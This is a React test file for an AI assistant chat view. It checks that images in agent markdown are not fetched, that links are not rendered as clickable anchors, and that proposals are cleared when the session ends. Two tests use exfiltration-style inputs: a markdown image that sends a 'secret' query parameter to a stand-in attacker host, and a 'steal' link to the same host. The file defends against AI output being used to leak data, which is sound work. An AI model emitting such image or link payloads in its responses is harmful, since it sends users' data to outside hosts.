import { render, screen } from '@testing-library/react';
import { beforeEach, describe, expect, it } from 'vitest';
import { useAssistantStore } from '@/stores/assistant-store';
import { makeProposal } from '@/test/assistant-fixtures';
import { AssistantChatView } from '../AssistantChatView';

function startSession(): void {
  const token = useAssistantStore.getState().beginSession('agent-1', 'edit');
  useAssistantStore.getState().activateSession(token, 's1', []);
}

describe('AssistantChatView agent markdown', () => {
  beforeEach(() => {
    useAssistantStore.getState().reset();
    startSession();
  });

  it('omits images and does not fetch them', () => {
    useAssistantStore.getState().appendUserMessage('hi');
    useAssistantStore.getState().appendChunk('s1', '![x](https://evil.test/p.png?d=secret)');
    useAssistantStore.getState().completeMessage('s1');
    const { container } = render(<AssistantChatView />);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('[image omitted: x]')).toBeInTheDocument();
  });

  it('shows a link as text and never as a navigating anchor', () => {
    useAssistantStore.getState().appendUserMessage('hi');
    useAssistantStore.getState().appendChunk('s1', '[open](https://evil.test/steal)');
    useAssistantStore.getState().completeMessage('s1');
    const { container } = render(<AssistantChatView />);
    expect(container.querySelector('a')).toBeNull();
    expect(screen.getByText('(https://evil.test/steal)')).toBeInTheDocument();
  });
});

describe('AssistantChatView proposals', () => {
  beforeEach(() => {
    useAssistantStore.getState().reset();
    startSession();
  });

  it('lists proposals and drops them when the session ends', () => {
    useAssistantStore
      .getState()
      .upsertProposal(
        makeProposal({
          change: { op: 'setEnvVar', collection: 'orders', environment: 'dev', key: 'K', value: 'v1' },
        }),
      );
    const { rerender } = render(<AssistantChatView />);
    expect(screen.getByRole('article', { name: 'Add a status test' })).toBeInTheDocument();
    expect(screen.getByText('Set K = v1 in environment dev')).toBeInTheDocument();

    useAssistantStore.getState().endSession();
    rerender(<AssistantChatView />);
    expect(screen.queryByRole('article')).not.toBeInTheDocument();
  });
});
